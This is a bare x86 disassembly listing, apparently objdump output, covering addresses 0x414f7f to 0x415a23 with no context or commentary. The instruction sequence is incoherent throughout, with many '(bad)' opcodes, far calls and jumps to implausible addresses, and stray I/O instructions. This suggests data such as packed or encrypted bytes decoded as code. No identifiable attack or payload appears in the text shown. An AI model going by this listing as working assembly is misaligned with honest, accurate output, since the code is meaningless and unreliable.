  414f7f:	fcmovnb st,st(4)
  414f81:	adc    eax,0x5cfe1126
  414f86:	js     0x414f9e
  414f88:	push   ecx
  414f89:	es nop
  414f8b:	data16 std 
  414f8d:	aam    0xdf
  414f8f:	call   0xe931:0x25e5e93f
  414f96:	cmp    eax,0xc0f6c066
  414f9b:	sar    edi,0xe8
  414f9e:	cmp    eax,0xf1441a
	...
  414fcb:	add    BYTE PTR [ebx+ebx*2],bh
  414fce:	add    cl,ch
  414fd0:	not    BYTE PTR [esi+0x5b41e6f4]
  414fd6:	add    BYTE PTR [ebx+0x3a],dl
  414fd9:	test   DWORD PTR [eax],eax
  414fdb:	inc    ebx
  414fdc:	inc    edx
  414fdd:	test   DWORD PTR [eax],eax
  414fdf:	pop    esp
  414fe0:	ja     0x414ff0
  414fe2:	push   ecx
  414fe3:	je     0x414fac
  414fe5:	or     eax,0xa2a1bef6
  414fea:	std    
  414feb:	cmp    al,0x9a
  414fed:	adc    DWORD PTR [ebp+ebp*4-0x7e],esi
  414ff1:	lock xor cl,ch
  414ff4:	cmp    eax,0x4715c066
  414ff9:	add    al,0x73
  414ffb:	call   0x63a9ab3d
  415000:	ret    0x9a
  415003:	add    al,al
  415005:	adc    ecx,DWORD PTR [edx]
  415007:	call   0x4069cc
  41500c:	inc    edi
  41500d:	xchg   esi,eax
  41500e:	int    0x8d
  415010:	pop    edx
  415011:	xchg   ebx,eax
  415012:	idiv   bh
  415014:	pusha  
  415015:	daa    
  415016:	push   eax
  415017:	call   0x406a2c
  41501c:	pop    esi
  41501d:	in     al,0xd9
  41501f:	div    DWORD PTR [eax-0x7e]
  415022:	in     eax,0x35
  415024:	jmp    0x414fa6
  415026:	(bad)  
  415027:	push   0xffffffa7
  415029:	xor    eax,0x5dd668bd
  41502e:	std    
  41502f:	mov    ch,0x0
	...
  415059:	add    BYTE PTR [ebx],dh
  41505b:	mov    bh,dh
  41505d:	jmp    DWORD PTR [eax+0x54]
  415060:	scas   al,BYTE PTR es:[edi]
  415061:	dec    eax
  415062:	out    0x5d,al
  415064:	call   0xfec2289e
  415069:	mov    DWORD PTR [edx],ebx
  41506b:	xchg   esi,esi
  41506d:	inc    DWORD PTR [eax+0x35]
  415070:	(bad)  
  415071:	addr16 and eax,0x7000412f
  415077:	rcr    cl,cl
  415079:	not    DWORD PTR [eax-0x80]
  41507c:	(bad)  
  41507d:	xor    eax,0x40d5b1
  415082:	outs   dx,DWORD PTR ds:[esi]
  415083:	push   0x8e70ff45
  415088:	test   ah,ch
  41508a:	push   0x276afe80
  41508f:	xor    eax,0x576668c7
  415094:	std    
  415095:	mov    ch,0xd3
  415097:	mov    esi,edi
  415099:	call   eax
  41509b:	push   ebx
  41509c:	scas   al,BYTE PTR es:[edi]
  41509d:	dec    eax
  41509e:	push   di
  4150a0:	call   0xfec1aa9e
  4150a5:	mov    DWORD PTR [esi],edi
  4150a7:	jg     0x415102
  4150a9:	test   BYTE PTR [ecx],0xe2
  4150ac:	xlat   BYTE PTR ds:[ebx]
  4150ad:	jmp    DWORD PTR [ecx-0x3a]
  4150b0:	fld    DWORD PTR [eax+0x3e]
  4150b3:	xchg   ecx,eax
  4150b4:	mov    eax,0x6e89f1db
  4150b9:	(bad)  
  4150ba:	sub    edx,DWORD PTR [eax-0x47]
  4150bd:	inc    eax
	...
  4150e6:	add    BYTE PTR [eax],al
  4150e8:	ds stos BYTE PTR es:[edi],al
  4150ea:	dec    edx
  4150eb:	inc    ebp
  4150ec:	shl    DWORD PTR [ecx-0x4e1d7b84],1
  4150f2:	outs   dx,BYTE PTR ds:[esi]
  4150f3:	(bad)  
  4150f4:	push   esp
  4150f5:	add    bl,dl
  4150f7:	shl    BYTE PTR [esi],1
  4150f9:	ret    
  4150fa:	add    edi,edi
  4150fc:	jmp    0x41516c
  4150fe:	jbe    0x4150fe
  415100:	test   eax,0xf6ae3849
  415105:	ret    0xe801
  415108:	fcmovnb st,st(0)
  41510a:	outs   dx,BYTE PTR ds:[esi]
  41510b:	inc    bh
  41510d:	ja     0x415170
  41510f:	test   BYTE PTR [ecx-0x6d437d97],0x69
  415116:	outs   dx,BYTE PTR ds:[esi]
  415117:	(bad)  
  415118:	ds mov ss,edx
  41511b:	add    bl,BYTE PTR ds:[bx-0x43]
  415120:	imul   ecx,DWORD PTR [edi-0x3ddb1807],0xef59fe6e
  41512a:	je     0x415122
  41512c:	push   ecx
  41512d:	xor    DWORD PTR [esp+esi*2+0x36],ebp
  415131:	sbb    bh,BYTE PTR [edi+0x3f]
  415134:	inc    ecx
  415135:	and    DWORD PTR [esp+esi*4+0x2a],ebp
  415139:	shr    DWORD PTR [ebx-0x2],1
  41513c:	xor    DWORD PTR [edi-0x4],eax
  41513f:	out    0xbe,eax
  415141:	inc    ecx
  415142:	imul   edi,esi,0x21
  415145:	xchg   DWORD PTR [esi+esi*8+0x19],ebx
  415149:	pop    ebx
  41514a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41514b:	ins    DWORD PTR es:[edi],dx
	...
  415174:	add    BYTE PTR [eax],al
  415176:	mov    ah,BYTE PTR [ebx-0x71]
  415179:	repnz dec ecx
  41517b:	adc    BYTE PTR [edi-0x69093593],dl
  415181:	ins    DWORD PTR es:[edi],dx
  415182:	clc    
  415183:	paddw  mm7,mm3
  415186:	fnstenv [esi+0x27]
  415189:	ins    DWORD PTR es:[edi],dx
  41518a:	call   0xe8a58e9e
  41518f:	movq   mm5,QWORD PTR [ebp+0x52]
  415193:	arpl   WORD PTR [edi-0x2a],cx
  415196:	adc    DWORD PTR [eax],edx
  415198:	pop    edi
  415199:	ins    DWORD PTR es:[edi],dx
  41519a:	xchg   edx,eax
  41519b:	cs pop edi
  41519d:	ins    DWORD PTR es:[edi],dx
  41519e:	ror    BYTE PTR [edi],0xd5
  4151a1:	sti    
  4151a2:	mov    eax,ds:0xb06d45da
  4151a7:	pcmpeqw mm2,QWORD PTR [eax-0x50]
  4151ab:	getsec 
  4151ad:	pop    esp
  4151ae:	push   edi
  4151af:	pushf  
  4151b0:	cs ins DWORD PTR es:[edi],dx
  4151b2:	cwde   
  4151b3:	lds    edx,FWORD PTR [edi]
  4151b5:	jne    0x415147
  4151b7:	movups xmm1,XMMWORD PTR ds:0x6d170ffd
  4151be:	retf   0x16fe
  4151c1:	ins    DWORD PTR es:[edi],dx
  4151c2:	js     0x4151c6
  4151c4:	fadd   st(0),st
  4151c6:	jo     0x4151d7
  4151c8:	push   DWORD PTR [esi+0x6cf70761]
  4151ce:	pop    ecx
  4151cf:	popa   
  4151d0:	stos   BYTE PTR es:[edi],al
  4151d1:	ins    BYTE PTR es:[edi],dx
  4151d2:	pop    eax
  4151d3:	setge  BYTE PTR [edi+0x48]
  4151d7:	pandn  mm3,QWORD PTR [ebx+0x0]
	...
  415203:	add    BYTE PTR [ebx-0x64],cl
  415206:	(bad)  
  415207:	ins    BYTE PTR es:[edi],dx
  415208:	inc    eax
  415209:	(bad)
  41520c:	cmp    BYTE PTR [edi],cl
  41520e:	shl    BYTE PTR [eax+0x7f],1
  415211:	push   cs
  415212:	mov    edi,0x113826c
  415217:	rcr    BYTE PTR ds:0xaaaefe11,0x87
  41521e:	cld    
  41521f:	xchg   ecx,eax
  415220:	adc    bh,BYTE PTR [esi]
  415222:	add    cl,ch
  415224:	inc    esp
  415225:	sbb    al,0x9
  415227:	jmp    0x6b2e3414
  41522c:	adc    DWORD PTR [edx],0xa417e96b
  415232:	std    
  415233:	hlt    
  415234:	in     eax,0xf6
  415236:	add    ebp,DWORD PTR [ecx]
  415238:	push   ebx
  415239:	or     eax,0x764e2488
  41523e:	sahf   
  41523f:	sar    esp,1
  415241:	push   cs
  415242:	call   esp
  415244:	(bad)
  415247:	push   edi
  415248:	push   edx
  415249:	or     eax,0xd29d4fe
  41524e:	je     0x415241
  415250:	adc    eax,0x1a3e403e
  415255:	and    eax,ebx
  415257:	in     eax,dx
  415258:	cmp    eax,0xbe3d89a8
  41525d:	sbb    dh,ch
  41525f:	mov    BYTE PTR es:[edx-0x18],ah
  415263:	xchg   edi,eax
  415264:	sub    BYTE PTR [ebx+0x0],bl
  415267:	loop   0x415269
	...
  415291:	add    ch,bh
  415293:	xchg   BYTE PTR [eax+eiz*1],al
  415296:	jmp    DWORD PTR [ecx+0x0]
  415299:	push   es
  41529a:	push   0x4887e85e
  41529f:	pop    ebx
  4152a0:	add    dl,ah
  4152a2:	std    
  4152a3:	xchg   BYTE PTR [eax+eiz*1],al
  4152a6:	jmp    DWORD PTR [ecx+0x0]
  4152a9:	jo     0x41532a
  4152ab:	push   es
  4152ac:	(bad)  
  4152ad:	push   esp
  4152ae:	(bad)  
  4152b0:	xchg   esp,eax
  4152b1:	sub    edx,ebp
  4152b3:	or     al,0x88
  4152b5:	and    al,0xa6
  4152b7:	or     eax,0x81fb0074
  4152bc:	je     0x4152b6
  4152be:	call   0xbc2960ce
  4152c3:	sar    dh,1
  4152c5:	call   FWORD PTR [edx+ebx*4]
  4152c8:	jno    0x415305
  4152ca:	mov    ds,WORD PTR [edx+esi*8]
  4152cd:	push   0x17
  4152cf:	xchg   ebx,eax
  4152d0:	inc    esp
  4152d1:	hlt    
  4152d2:	inc    edi
  4152d3:	xor    BYTE PTR [esp+edi*8-0x41],0xaa
  4152d8:	push   0xffffffff
  4152da:	mov    eax,0x174be0d
  4152df:	xor    bh,dh
  4152e1:	(bad)  
  4152e3:	sar    dh,0x75
  4152e6:	fbstp  TBYTE PTR [ecx-0x7da7c10a]
  4152ec:	(bad)  
  4152ed:	jne    0x4152ca
  4152ef:	xor    BYTE PTR [eax+ecx*1+0x7f],0xd1
  4152f4:	inc    DWORD PTR ds:[eax]
	...
  41531f:	add    BYTE PTR [eax],cl
  415321:	xor    BYTE PTR [esp+esi*8-0x8],0xb
  415326:	cli    
  415327:	push   edx
  415329:	adc    esi,esp
  41532b:	adc    al,0xa8
  41532d:	cmp    dh,0xff
  415330:	shl    BYTE PTR [ebp-0x1b],cl
  415333:	and    eax,0xc9fe80e5
  415338:	push   ebp
  415339:	adc    edi,esi
  41533b:	push   esp
  41533c:	sbb    al,0xb3
  41533e:	add    ah,0x33
  415341:	sub    edi,edi
  415343:	jne    0x4153b0
  415345:	mov    cl,0xee
  415347:	inc    esi
  415348:	push   0xe2c00a80
  41534d:	pop    edx
  41534e:	pop    esi
  41534f:	leave  
  415350:	and    eax,0x228cfe13
  415355:	xchg   DWORD PTR [ebp-0x1],ecx
  415358:	repnz adc ah,dh
  41535b:	mov    eax,ds:0xfe693d3e
  415360:	inc    ebp
  415361:	ret    0x83fa
  415364:	push   ds
  415365:	add    eax,DWORD PTR [edx]
  415367:	add    BYTE PTR [ecx],ch
  415369:	dec    eax
  41536a:	push   0x69403ae7
  41536f:	inc    bh
  415371:	aaa    
  415372:	pop    eax
  415373:	dec    BYTE PTR [ebx+0x1a746ab6]
  415379:	out    dx,al
  41537a:	lock not DWORD PTR [esi]
  41537d:	sbb    esp,eax
  41537f:	(bad)  
  415380:	stc    
  415381:	jns    0x415373
  415383:	jmp    0x415385
	...
  4153ad:	add    bh,ah
  4153af:	mov    eax,ds:0x6a3e0001
  4153b4:	imul   esp,DWORD PTR [edi+0x7f],0x2
  4153b8:	shl    bh,1
  4153ba:	mov    esp,ecx
  4153bc:	add    DWORD PTR [eax],eax
  4153be:	inc    ebp
  4153bf:	inc    edx
  4153c0:	lock add al,0xd7
  4153c3:	fiadd  DWORD PTR [ecx]
  4153c5:	add    BYTE PTR [esi],bh
  4153c7:	jns    0x41543a
  4153c9:	addr16 mov bh,0x1a
  4153cc:	(bad)  
  4153cf:	mov    BYTE PTR ds:0x72013e00,dl
  4153d5:	mov    BYTE PTR [ebx],ch
  4153d7:	call   0x5601:0xc32708d9
  4153de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4153df:	sub    BYTE PTR [eax],bl
  4153e1:	add    BYTE PTR [esi],bh
  4153e3:	or     DWORD PTR [edx+0x74],eax
  4153e6:	cmp    al,0x59
  4153e8:	out    dx,eax
  4153e9:	mov    DWORD PTR [esi+0x7a],ecx
  4153ec:	shl    dl,1
  4153ee:	(bad)  
  4153ef:	mov    edi,0xeb35675d
  4153f4:	(bad)  
  4153f5:	dec    DWORD PTR [ebx]
  4153f7:	pop    edx
  4153f8:	adc    al,0x2e
  4153fa:	ds add bh,bh
  4153fd:	mov    edi,0x5ce95acb
  415402:	jmp    0x2882:0x34dcd7df
  415409:	add    al,0x26
  41540b:	pushf  
  41540c:	sti    
  41540d:	add    edi,DWORD PTR [esi]
  41540f:	pop    eax
  415410:	mov    bh,0x7b
	...
  41543a:	add    BYTE PTR [eax],al
  41543c:	mov    dl,0x2f
  41543e:	push   eax
  41543f:	sti    
  415440:	xchg   esi,eax
  415441:	call   0x3fc:0xfc21d1e7
  415448:	ds pusha 
  41544a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41544b:	out    dx,eax
  41544c:	aas    
  41544d:	add    bl,ah
  41544f:	jge    0x415482
  415451:	jecxz  0x41548f
  415453:	push   ecx
  415454:	(bad)  
  415455:	xchg   ebp,eax
  415456:	scas   eax,DWORD PTR es:[edi]
  415457:	jge    0x4154d3
  415459:	imul   DWORD PTR [ebp+0x24e03e04]
  41545f:	dec    esp
  415460:	sti    
  415461:	pop    edx
  415462:	out    0x68,eax
  415464:	push   edx
  415465:	das    
  415466:	outs   dx,DWORD PTR ds:[esi]
  415467:	out    dx,eax
  415468:	(bad)  [ebx]
  41546a:	(bad)  
  41546c:	loope  0x415455
  41546e:	pop    ebp
  41546f:	imul   eax,eax,0xc464bce0
  415475:	xchg   ebp,eax
  415476:	inc    ebx
  415477:	jl     0x4154ba
  415479:	loope  0x415417
  41547b:	push   eax
  41547c:	mov    ah,0x95
  41547e:	pop    ds
  41547f:	jl     0x4154b2
  415481:	fcomi  st,st(5)
  415483:	add    ecx,DWORD PTR [ecx-0x2a]
  415486:	xchg   ebx,eax
  415487:	push   0xef270b90
  41548c:	xchg   ebp,eax
  41548d:	add    cl,al
  41548f:	ret    0xb80
  415492:	gs mov edi,0xb8ffaa69
  415498:	clc    
  415499:	or     eax,DWORD PTR [edi]
  41549b:	pop    ebp
  41549c:	imul   ebp,DWORD PTR [ebp+0x4630],0x0
	...
  4154ca:	xor    eax,0xda9c005b
  4154cf:	(bad)  
  4154d0:	std    
  4154d1:	je     0x41551c
  4154d3:	repz pop ebx
  4154d5:	sub    al,0xd7
  4154d7:	or     al,0xa
  4154d9:	test   eax,0xb5684251
  4154de:	adc    eax,0x9239009c
  4154e3:	repz inc esp
  4154e5:	(bad)  
  4154e6:	xchg   esi,eax
  4154e7:	call   0x4100:0x4a8c3e68
  4154ee:	inc    edx
  4154ef:	pop    ebx
  4154f0:	in     eax,dx
  4154f1:	outs   dx,DWORD PTR ds:[esi]
  4154f2:	cmc    
  4154f3:	imul   DWORD PTR [eax+0x28]
  4154f6:	inc    edx
  4154f7:	stos   DWORD PTR es:[edi],eax
  4154f8:	std    
  4154f9:	adc    al,0x2
  4154fb:	add    esp,DWORD PTR ds:0xe9096701
  415501:	mov    cl,0xfd
  415503:	or     esi,edi
  415505:	mov    al,0x83
  415507:	bound  eax,QWORD PTR [eax]
  415509:	adc    al,0x63
  41550b:	test   BYTE PTR [ecx+0x7461ad],0x3
  415512:	nop
  415513:	or     DWORD PTR [ecx+esi*8+0x65],esi
  415517:	add    al,0x3c
  415519:	pop    esi
  41551a:	push   esi
  41551b:	rol    DWORD PTR [ebx+0x55],cl
  41551e:	fwait
  41551f:	fs std 
  415521:	aam    0xb5
  415523:	add    ah,BYTE PTR [esi+eax*2+0xa6b0916]
  41552a:	pop    ss
  41552b:	(bad)
	...
  415557:	add    dl,cl
  415559:	or     esi,edi
  41555b:	cs jae 0x4155c4
  41555e:	std    
  41555f:	pushf  
  415560:	test   DWORD PTR [edx],eax
  415562:	nop
  415563:	push   ds
  415564:	push   ss
  415565:	or     DWORD PTR [ecx-0x17],ebp
  415568:	cmp    eax,0xde81befa
  41556d:	cmp    DWORD PTR [edi],0xda265700
  415573:	push   0x75fd5e96
  415578:	pop    edi
  415579:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41557a:	(bad)  
  41557b:	imul   esp,DWORD PTR [eax-0x7e],0x826375fe
  415582:	je     0x41558c
  415584:	outs   dx,DWORD PTR ds:[esi]
  415585:	je     0x4155c3
  415587:	call   DWORD PTR [eax]
  415589:	dec    eax
  41558a:	mov    edi,0x8b2b2704
  41558f:	in     al,dx
  415590:	xchg   esi,eax
  415591:	fwait
  415592:	aad    0xf7
  415594:	loopne 0x415517
  415596:	mov    WORD PTR [ebp-0x2d],es
  415599:	push   DWORD PTR cs:[ebp-0xd]
  41559d:	xor    BYTE PTR [eax+ecx*1-0x51],0xeb
  4155a2:	sub    DWORD PTR [eax],eax
  4155a4:	pop    ss
  4155a5:	add    eax,0x9f6a0fbe
  4155aa:	add    BYTE PTR [eax],al
  4155ac:	out    0x48,eax
  4155ae:	inc    esp
  4155af:	clc    
  4155b0:	xlat   BYTE PTR ds:[ebx]
  4155b1:	pop    ebp
  4155b2:	add    BYTE PTR [eax],al
  4155b4:	cwde   
  4155b5:	sbb    esi,edx
  4155b7:	(bad)  
  4155b8:	call   0xab561a
	...
  4155e5:	add    bh,ah
  4155e7:	and    edi,esi
  4155e9:	imul   edx,edi,0x9a8cfe23
  4155ef:	jns    0x41563e
  4155f1:	lea    ebp,[edx]
  4155f3:	mov    esi,esi
  4155f5:	inc    DWORD PTR [eax]
  4155f7:	das    
  4155f8:	push   DWORD PTR [ebp-0x1]
  4155fb:	xor    DWORD PTR [esp+edi*8+0xf],0xa7002a2a
  415603:	add    al,0xbe
  415605:	je     0x4155a1
  415607:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415608:	add    BYTE PTR [ecx],0x97
  41560b:	pop    ebp
  41560c:	push   0xfe1ecf8a
  415611:	(bad)  
  415612:	ds out 0xf5,eax
  415615:	out    0xb6,eax
  415617:	mov    ah,0x66
  415619:	dec    BYTE PTR [esi]
  41561b:	lea    edx,[esp+ecx*4-0x45]
  41561f:	movq   mm7,mm6
  415622:	pop    ecx
  415623:	jecxz  0x4155f4
  415625:	out    0xa6,eax
  415627:	mov    ah,0x66
  415629:	(bad)  
  41562a:	mov    bh,0x76
  41562c:	dec    ecx
  41562d:	test   BYTE PTR [ecx+0x28],0x5a
  415631:	std    
  415632:	jns    0x415665
  415634:	imul   edi,DWORD PTR ds:0x2d9a,0x66f27f69
  41563d:	mov    ah,0x6
  41563f:	shl    BYTE PTR [esi-0x2],cl
  415642:	sbb    DWORD PTR [eax-0x4],ecx
  415645:	out    0x3f,eax
  415647:	xor    eax,0xfe65
	...
  415674:	mov    bh,0x77
  415676:	jno    0x41566e
  415678:	add    edx,ebp
  41567a:	xlat   BYTE PTR ds:[ebx]
  41567b:	jmp    DWORD PTR [ecx+0x32]
  41567e:	fild   DWORD PTR [eax+0x3e]
  415681:	fnstenv [eax+0x66e1f1d7]
  415687:	(bad)  
  415688:	imul   ecx,DWORD PTR [edx],0x5a
  41568b:	in     eax,0x7c
  41568d:	xchg   ecx,eax
  41568e:	data16 mov BYTE PTR [ebx-0x3601917a],bh
  415695:	sub    al,0x2
  415697:	push   0xffc52b77
  41569c:	mov    eax,0xb1f649e7
  4156a1:	cdq    
  4156a2:	data16 je 0x4156db
  4156a5:	stos   BYTE PTR es:[edi],al
  4156a6:	cmp    al,BYTE PTR [ecx-0x5f]
  4156a9:	dec    ecx
  4156aa:	jl     0x415630
  4156ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4156ad:	dec    ecx
  4156ae:	data16 inc bl
  4156b1:	jg     0x4156f8
  4156b3:	test   BYTE PTR [ecx+0x19d3265b],0xad
  4156ba:	nop
  4156bb:	les    edi,FWORD PTR [ecx+0x9]
  4156be:	pop    ebp
  4156bf:	dec    ebx
  4156c0:	push   0xf2660f08
  4156c5:	push   edx
  4156c6:	setp   bh
  4156c9:	pop    es
  4156ca:	(bad)  
  4156cb:	jnp    0x41568f
  4156cd:	(bad)  
  4156ce:	(bad)  
  4156cf:	gs push eax
  4156d1:	jne    0x4156ba
  4156d3:	fucomi st,st(2)
  4156d5:	jno    0x4156ff
  4156d7:	add    al,0x0
	...
  415701:	add    BYTE PTR [ecx-0x32],al
  415704:	mov    edi,0xd708386d
  415709:	out    dx,eax
  41570a:	cmp    ebx,esi
  41570c:	ja     0x4156d0
  41570e:	sub    BYTE PTR [eax],cl
  415710:	jno    0x415791
  415712:	add    DWORD PTR [eax],edx
  415714:	mov    edi,0xb7c5bc65
  415719:	ins    DWORD PTR es:[edi],dx
  41571a:	adc    BYTE PTR [eax],cl
  41571c:	call   0x651dec10
  415721:	pop    eax
  415722:	or     BYTE PTR [eax],cl
  415724:	lahf   
  415725:	add    al,0x72
  415727:	jge    0x415793
  415729:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41572a:	(bad)  [edi]
  41572c:	(bad)  
  41572d:	gs jmp 0xe21d77be
  415733:	pop    es
  415734:	(bad)  
  415735:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415736:	fmul   DWORD PTR [ebp+0x43d45bd7]
  41573c:	outs   dx,BYTE PTR ds:[esi]
  41573d:	gs enter 0x57cd,0x6d
  415742:	rol    BYTE PTR [edi],0x5f
  415745:	out    dx,eax
  415746:	dec    ecx
  415747:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415749:	daa    
  41574a:	mov    cl,0x7
  41574c:	dec    edi
  41574d:	scas   eax,DWORD PTR es:[edi]
  41574e:	xchg   ebp,eax
  41574f:	cmova  esp,DWORD PTR [ebp-0x60]
  415753:	(bad)  
  415754:	xlat   BYTE PTR ds:[ebx]
  415755:	pop    ebx
  415756:	inc    BYTE PTR [esi+0x0]
  415759:	sbb    ecx,DWORD PTR ss:[ecx]
  41575c:	mov    ah,0x41
  41575e:	sbb    ecx,DWORD PTR [ecx]
  415760:	(bad)  
  415761:	es xchg ecx,eax
  415763:	push   edi
  415764:	call   0x415843
	...
  41578d:	add    BYTE PTR [eax],al
  41578f:	add    BYTE PTR [ecx],ah
  415791:	or     dh,bh
  415793:	push   ss
  415794:	mov    eax,ds:0xe30ef623
  415799:	or     BYTE PTR [ebp+ecx*1-0x101f72d],dh
  4157a0:	push   0x26fae857
  4157a5:	or     dh,bh
  4157a7:	out    dx,al
  4157a8:	cwde   
  4157a9:	daa    
  4157aa:	mul    dh
  4157ac:	fimul  DWORD PTR [eax]
  4157ae:	je     0x4157a9
  4157b0:	xchg   ebp,eax
  4157b1:	imul   edi,DWORD PTR [esi+edx*8],0xffffff9a
  4157b5:	add    eax,0xcfa2f974
  4157ba:	fdivr  DWORD PTR [esi+0x34fe059a]
  4157c0:	sbb    bh,bh
  4157c2:	jb     0x41577b
  4157c4:	call   0xfe0d:0x7574fe05
  4157cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4157cc:	gs cld 
  4157ce:	ds sahf 
  4157d0:	bound  eax,QWORD PTR ds:0x56299b4
  4157d6:	inc    BYTE PTR [ecx-0x7902b786]
  4157dc:	pop    edx
  4157dd:	iret   
  4157de:	in     al,dx
  4157df:	jbe    0x415843
  4157e1:	add    eax,0x61ba5e9
  4157e6:	(bad)  
  4157e7:	outs   dx,BYTE PTR ds:[esi]
  4157e8:	cwde   
  4157e9:	(bad)  
  4157ea:	cmc    
  4157eb:	pop    dx
  4157ed:	(bad)  
  4157ee:	mov    edi,0xfe05231f
  4157f3:	pushf  
	...
  41581c:	add    BYTE PTR [eax],al
  41581e:	adc    DWORD PTR ds:0xd0054efe,ecx
  415824:	ds add al,bh
  415827:	jle    0x415827
  415829:	mov    ch,0x7
  41582b:	ja     0x41582b
  41582d:	(bad)  
  41582e:	jmp    edx
  415830:	cmp    edi,edi
  415832:	pop    eax
  415833:	jg     0x415879
  415835:	clc    
  415836:	cs iret 
  415838:	sti    
  415839:	call   FWORD PTR [eax+0x7f]
  41583c:	je     0x41583a
  41583e:	aas    
  41583f:	inc    edi
  415840:	daa    
  415841:	add    BYTE PTR [edi+0x41],dl
  415844:	mov    edi,0x8b15570c
  415849:	in     al,dx
  41584a:	in     al,0x45
  41584c:	stc    
  41584d:	push   0x67
  41584f:	and    al,0x4b
  415851:	call   edx
  415853:	add    esi,esp
  415855:	mov    ebp,0x89fe7a1c
  41585a:	bound  edi,QWORD PTR [ebx-0x2]
  41585d:	jne    0x41587e
  41585f:	repnz adc ch,BYTE PTR [ecx+0x56]
  415863:	pop    edi
  415864:	std    
  415865:	xor    eax,0x4116c9
  41586a:	out    dx,eax
  41586b:	mov    ds:0x79c8fffc,al
  415870:	je     0x41587a
  415872:	jg     0x415882
  415874:	imul   eax,DWORD PTR [ecx+0x17],0xe7fffff2
  41587b:	fxam   
  41587d:	loop   0x415849
  41587f:	jns    0x41587f
  415881:	inc    DWORD PTR [eax]
	...
  4158ab:	add    BYTE PTR [edx+0x7b],dl
  4158ae:	(bad)  
  4158af:	jne    0x4158a0
  4158b1:	jno    0x415880
  4158b3:	cmp    ebx,DWORD PTR [eax+0x7a]
  4158b6:	enter  0xe3c2,0x59
  4158ba:	push   ebx
  4158bb:	mov    ecx,DWORD PTR [ebx-0x22]
  4158be:	sar    esp,0xed
  4158c1:	pop    ecx
  4158c2:	push   0x4c
  4158c4:	sbb    BYTE PTR [esi+eax*1],ah
  4158c7:	call   0xff60810a
  4158cc:	test   eax,0x16fbc77a
  4158d1:	hlt    
  4158d2:	add    edi,ebp
  4158d4:	fsubr  DWORD PTR [ebx]
  4158d6:	in     al,dx
  4158d7:	push   0x74e9f3ff
  4158dc:	pop    ss
  4158dd:	mov    bl,0x1
  4158df:	dec    DWORD PTR [ebx]
  4158e1:	or     al,0x6a
  4158e3:	pop    esi
  4158e4:	loope  0x41594a
  4158e6:	popa   
  4158e7:	(bad)  
  4158e8:	jmp    0x415959
  4158ea:	popa   
  4158eb:	je     0x415923
  4158ed:	pop    esp
  4158ee:	ja     0x41592a
  4158f0:	popa   
  4158f1:	pop    esp
  4158f2:	dec    ebx
  4158f3:	rol    DWORD PTR [edx-0xc],0xb8
  4158f7:	mov    ah,BYTE PTR [edx+0x72]
  4158fa:	dec    eax
  4158fb:	iret   
  4158fc:	push   ecx
  4158fd:	hlt    
  4158fe:	bound  ecx,QWORD PTR [ebx+edi*8-0x4c014e01]
  415905:	mul    BYTE PTR [edx+0x74]
  415908:	inc    esi
  415909:	sbb    dh,BYTE PTR [ecx]
  41590b:	sub    bh,BYTE PTR [esi]
  41590d:	repnz push cs
  41590f:	rol    BYTE PTR [eax],0x0
	...
  41593a:	xor    DWORD PTR [edi-0x8],esi
  41593d:	add    DWORD PTR [esi],edi
  41593f:	repnz dec edx
  415941:	inc    esp
  415942:	push   ss
  415943:	repz add DWORD PTR [eax],eax
  415946:	ds mov ebp,0xf601f3c8
  41594c:	add    DWORD PTR [eax],eax
  41594e:	fs bnd jmp 0x415951
  415952:	addr16 bnd jmp 0x415955
  415956:	mov    edx,0xb34f583f
  41595b:	ja     0x4159b2
  41595d:	neg    cl
  41595f:	test   DWORD PTR [ecx+0x628a4bfe],esi
  415965:	je     0x415931
  415967:	fisub  DWORD PTR [edx+0x28]
  41596a:	ds pop ebx
  41596c:	out    0xe,eax
  41596e:	jle    0x4158ff
  415970:	in     al,0x6c
  415972:	mov    DWORD PTR [edx-0x19],ebx
  415975:	add    edx,DWORD PTR [esi]
  415977:	rcr    DWORD PTR [edi-0x42fa5e3c],1
  41597d:	(bad)  
  41597f:	stos   DWORD PTR es:[edi],eax
  415980:	test   al,0x62
  415982:	nop
  415983:	stos   DWORD PTR es:[edi],eax
  415984:	bound  esi,QWORD PTR [ebx]
  415986:	mov    edx,0x805a33de
  41598b:	add    al,0xb8
  41598d:	mov    ch,0x61
  41598f:	fwait
  415990:	test   al,0x62
  415992:	jo     0x415966
  415994:	ins    BYTE PTR es:[edi],dx
  415995:	cmp    esi,DWORD PTR [eax+0x4]
  415998:	packssdw mm1,mm3
  41599b:	inc    esi
  41599c:	push   es
  41599d:	bound  eax,QWORD PTR [eax]
	...
  4159c7:	add    bh,ah
  4159c9:	pop    edx
  4159ca:	(bad)  
  4159cb:	jg     0x4159b3
  4159cd:	cdq    
  4159ce:	out    0x62,eax
  4159d0:	xchg   edx,eax
  4159d1:	and    esi,edi
  4159d3:	popa   
  4159d4:	inc    eax
  4159d5:	add    al,0x5d
  4159d7:	or     al,0x26
  4159d9:	loop   0x415a02
  4159db:	popa   
  4159dc:	xor    dl,dl
  4159de:	ins    BYTE PTR es:[edi],dx
  4159df:	push   esp
  4159e0:	xor    BYTE PTR [edi+ecx*8],al
  4159e3:	out    dx,al
  4159e4:	and    DWORD PTR [edx+edi*2-0x15],edi
  4159e8:	jle    0x415a45
  4159ea:	mov    esi,0xb70be997
  4159ef:	popa   
  4159f0:	or     BYTE PTR [esi-0x647c9421],cl
  4159f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4159f7:	popa   
  4159f8:	(bad)  
  4159f9:	fisttp QWORD PTR [ebx+0x203f059]
  4159ff:	add    al,0x56
  415a01:	adc    eax,DWORD PTR [ecx]
  415a03:	ret    
  415a04:	loope  0x415a0a
  415a06:	cmp    eax,0x7f03d03c
  415a0b:	popa   
  415a0c:	dec    edx
  415a0d:	push   ebx
  415a0e:	add    BYTE PTR [ecx+0x6efd43e3],al
  415a14:	mov    ch,0xde
  415a16:	call   0x8c467979
  415a1b:	dec    BYTE PTR fs:[esi+edi*8]
  415a1f:	push   esi
  415a20:	bnd jnp 0x415a02
